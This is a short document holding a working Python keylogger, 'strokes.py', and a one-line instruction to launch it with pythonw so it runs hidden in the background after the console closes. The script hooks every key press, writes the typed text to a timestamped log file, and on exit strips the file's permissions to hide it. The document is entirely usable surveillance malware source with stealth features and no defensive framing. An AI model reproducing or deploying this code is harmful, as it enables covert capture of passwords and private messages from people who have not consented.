

Command to run strokes and continue to run in the background even if the cmd window is closed.
```
pythonw strokes.py
```


```
import keyboard
import logging
import os
import datetime
import atexit

# Set up logging
boot_time = datetime.datetime.now()
log_file = f"strokes_{boot_time.strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(message)s')

buffer = ""

def on_key_event(event):
    global buffer
    try:
        # Log the key pressed
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'enter':
                logging.info(buffer)
                buffer = ""
            elif event.name == 'space':
                buffer += ' '
            elif event.name == 'backspace':
                buffer = buffer[:-1]
            else:
                buffer += event.name
    except Exception as e:
        logging.error(f"Error logging key event: {e}")

def main():
    """Main function to set up the key event hook and start listening."""
    try:
        # Set up the key event hook
        keyboard.on_press(on_key_event)

        # Register a function to be called when the program exits
        atexit.register(on_exit)

        # Keep the program running indefinitely
        while True:
            pass
    except Exception as e:
        logging.error(f"Error starting strokes: {e}")

def on_exit():
    """Function to be called when the program exits"""
    logging.info("Strokes stopped.")
    logging.info(f"Log file saved to: {os.path.abspath(log_file)}")

    # Make the log file invisible
    os.chmod(log_file, 0o000)

if __name__ == "__main__":
    main()
```

